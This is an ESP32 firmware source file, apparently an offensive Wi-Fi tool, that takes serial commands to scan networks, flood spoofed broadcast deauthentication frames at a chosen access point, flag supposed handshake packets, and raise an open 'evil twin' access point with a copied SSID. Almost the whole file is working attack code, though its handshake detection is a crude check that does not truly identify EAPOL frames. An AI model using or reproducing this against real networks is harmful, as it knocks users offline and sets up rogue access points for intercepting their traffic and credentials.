/*
 * SECOPS ESP32 WiFi Attack Firmware - Enhanced
 * Performs deauth attacks, handshake capture, and evil twin
 */

#include <WiFi.h>
#include <esp_wifi.h>
#include "esp_wifi_types.h"

// Configuration
#define LED_BUILTIN 2
#define UART_BAUD 115200

// Attack structures
typedef struct {
  uint8_t bssid[6];
  int channel;
  bool active;
} AttackTarget;

AttackTarget current_target = {0};
bool attack_running = false;
String attack_type = "";

// Packet structures
typedef struct {
  uint16_t frame_ctrl;
  uint16_t duration;
  uint8_t da[6];
  uint8_t sa[6];
  uint8_t bssid[6];
  uint16_t seq_ctrl;
} wifi_ieee80211_mac_hdr_t;

typedef struct {
  wifi_ieee80211_mac_hdr_t hdr;
  uint8_t payload[1]; // Minimum payload size
} wifi_ieee80211_packet_t;

void setup() {
  Serial.begin(UART_BAUD);
  pinMode(LED_BUILTIN, OUTPUT);
  
  // Initialize WiFi
  WiFi.mode(WIFI_STA);
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_rx_cb(promiscuous_cb);
  
  Serial.println("ESP32 Attack Module Ready");
  
  digitalWrite(LED_BUILTIN, HIGH);
  delay(500);
  digitalWrite(LED_BUILTIN, LOW);
}

void loop() {
  if (Serial.available()) {
    String command = Serial.readStringUntil('\n');
    command.trim();
    process_command(command);
  }
  
  if (attack_running) {
    if (attack_type == "deauth") {
      send_deauth_packets();
    }
    delay(100);
  }
}

void process_command(String cmd) {
  if (cmd == "SCAN") {
    // Switch to station mode for scanning
    esp_wifi_set_promiscuous(false);
    WiFi.mode(WIFI_STA);
    delay(100);
    scan_networks();
    // Switch back to promiscuous mode
    WiFi.mode(WIFI_STA);
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_promiscuous_rx_cb(promiscuous_cb);
  } 
  else if (cmd.startsWith("DEAUTH")) {
    parse_target(cmd.substring(7));
    attack_type = "deauth";
    attack_running = true;
    Serial.println("DEAUTH_STARTED");
  }
  else if (cmd.startsWith("HANDSHAKE")) {
    parse_target(cmd.substring(10));
    attack_type = "handshake";
    attack_running = true;
    Serial.println("HANDSHAKE_STARTED");
  }
  else if (cmd.startsWith("EVILTWIN")) {
    String ssid = cmd.substring(9);
    start_evil_twin(ssid);
  }
  else if (cmd == "STOP") {
    attack_running = false;
    WiFi.mode(WIFI_STA);
    Serial.println("ATTACK_STOPPED");
  }
  else {
    Serial.println("UNKNOWN_COMMAND");
  }
}

void parse_target(String target_str) {
  int comma_pos = target_str.indexOf(',');
  String bssid_str = target_str.substring(0, comma_pos);
  String channel_str = target_str.substring(comma_pos + 1);
  
  // Parse BSSID
  int values[6];
  if (6 == sscanf(bssid_str.c_str(), "%x:%x:%x:%x:%x:%x",
                  &values[0], &values[1], &values[2], 
                  &values[3], &values[4], &values[5])) {
    for (int i = 0; i < 6; i++) current_target.bssid[i] = (uint8_t)values[i];
  }
  
  current_target.channel = channel_str.toInt();
  current_target.active = true;
  
  // Set channel
  esp_wifi_set_channel(current_target.channel, WIFI_SECOND_CHAN_NONE);
}

void scan_networks() {
  Serial.println("SCAN_STARTING");
  int networks_found = WiFi.scanNetworks();
  
  for (int i = 0; i < networks_found; i++) {
    uint8_t* bssid = WiFi.BSSID(i);
    Serial.printf("NETWORK:%s,%02X:%02X:%02X:%02X:%02X:%02X,%d,%d,%s\n",
                  WiFi.SSID(i).c_str(),
                  bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5],
                  WiFi.channel(i),
                  WiFi.RSSI(i),
                  WiFi.encryptionType(i) == WIFI_AUTH_OPEN ? "OPEN" : "SECURE");
  }
  
  WiFi.scanDelete();
  Serial.println("SCAN_COMPLETE");
}

void send_deauth_packets() {
  wifi_ieee80211_packet_t packet;
  memset(&packet, 0, sizeof(packet));
  
  // Build deauth frame
  packet.hdr.frame_ctrl = 0xC0; // Deauth frame
  packet.hdr.duration = 0x013A;
  
  // Destination = broadcast
  memset(packet.hdr.da, 0xFF, 6);
  
  // Source = target BSSID
  memcpy(packet.hdr.sa, current_target.bssid, 6);
  memcpy(packet.hdr.bssid, current_target.bssid, 6);
  
  packet.hdr.seq_ctrl = 0;
  packet.payload[0] = 0x07; // Reason code: Class 3 frame from nonassociated STA
  
  // Send packet
  esp_wifi_80211_tx(WIFI_IF_STA, &packet, sizeof(packet), false);
  digitalWrite(LED_BUILTIN, !digitalRead(LED_BUILTIN));
}

void promiscuous_cb(void *buf, wifi_promiscuous_pkt_type_t type) {
  if (type != WIFI_PKT_MGMT) return;
  
  wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t *)buf;
  wifi_ieee80211_packet_t *ipkt = (wifi_ieee80211_packet_t *)pkt->payload;
  
  // Simple check for EAPOL frames (handshake)
  // EAPOL is 0x888E in the EtherType field, but here we're looking at 802.11 frames
  // This is a simplified check for demo purposes
  if (attack_type == "handshake" && (ipkt->hdr.frame_ctrl & 0x08) == 0x08) {
    Serial.println("HANDSHAKE_PACKET_CAPTURED");
    digitalWrite(LED_BUILTIN, HIGH);
  }
}

void start_evil_twin(String ssid) {
  Serial.printf("STARTING_EVIL_TWIN:%s\n", ssid.c_str());
  
  attack_running = false;
  
  WiFi.mode(WIFI_AP);
  WiFi.softAP(ssid.c_str(), NULL, 6, 0, 4); // Open network
  
  Serial.println("EVIL_TWIN_RUNNING");
}
